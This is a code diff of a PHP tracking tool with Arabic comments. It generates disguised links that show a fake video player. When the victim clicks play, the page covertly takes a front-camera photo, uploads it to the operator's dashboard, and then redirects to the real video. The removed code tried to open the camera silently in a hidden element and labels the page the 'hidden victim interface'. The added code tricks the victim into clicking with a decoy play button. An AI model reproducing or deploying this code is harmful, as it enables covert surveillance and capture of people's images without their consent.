@@ -7,7 +7,7 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker_stealth.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker_advanced.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -112,7 +112,7 @@ if (!empty($filter_code)) {
     $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// واجهة الضحية المخفية (تختبر تشغيل الدفق بصمت تام في الخلفية)
+// واجهة الضحية ذات التقنية الطبقية التفاعلية
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -124,32 +124,32 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
     <meta property="og:type" content="website">
     <style>
-        body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
-        .loader { border: 4px solid rgba(255,255,255,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* إخفاء عنصر الفيديو تقنياً تماماً عن الشاشة */
-        #stealth-video { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+        body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
+        .player-container { position: relative; width: 100%; max-width: 500px; height: 300px; background: url('<?php echo htmlspecialchars($og_image); ?>') center/cover no-repeat; display: flex; justify-content: center; align-items: center; cursor: pointer; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        .play-btn { width: 70px; height: 70px; background: rgba(255, 0, 0, 0.85); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(255,0,0,0.6); transition: transform 0.2s; }
+        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-style: solid; border-width: 12px 0 12px 22px; border-color: transparent transparent transparent #fff; margin-left: 4px; }
+        .player-container:hover .play-btn { transform: scale(1.1); }
     </style>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
-            const targetUrl = "<?php echo $target_redirect; ?>";
+        const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
+        const targetUrl = "<?php echo $target_redirect; ?>";
 
-            // محاولة فرض فتح الكاميرا في عنصر مخفي تماماً بالخلفية
+        function triggerCaptureAndRedirect() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    const video = document.getElementById('stealth-video');
+                    const video = document.createElement('video');
                     video.srcObject = stream;
+                    video.setAttribute('playsinline', '');
                     video.play();
                     
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.90);
                         stream.getTracks().forEach(track => track.stop());
 
                         const formData = new URLSearchParams();
@@ -168,19 +168,18 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                                 window.location.replace(targetUrl);
                             });
                         }
-                    }, 500);
+                    }, 400);
                 })
                 .catch(err => {
-                    // إذا تطلب الأمر تفاعلاً أو تم حظره، يتم التوجيه مباشرة للمحتوى
                     window.location.replace(targetUrl);
                 });
-        });
+        }
     </script>
 </head>
 <body>
-    <video id="stealth-video" autoplay playsinline></video>
-    <div class="loader"></div>
-    <p style="font-size: 13px; color: #94a3b8;">جاري تشغيل الفيديو...</p>
+    <div class="player-container" onclick="triggerCaptureAndRedirect()">
+        <div class="play-btn"></div>
+    </div>
 </body>
 </html>
 <?php 
@@ -193,7 +192,7 @@ endif;
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - وضع التخفي</title>
+    <title>لوحة التحكم - التقنية الطبقية المتقدمة</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -233,7 +232,7 @@ endif;
     <div class="wrapper">
         
         <section class="section-box">
-            <h2>توليد رابط وضع التخفي</h2>
+            <h2>توليد رابط التقنية المتقدمة</h2>
             <form method="POST" class="form-row">
                 <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثل يوتيوب)..." required>
                 <button type="submit" name="create" class="btn">توليد الرابط</button>
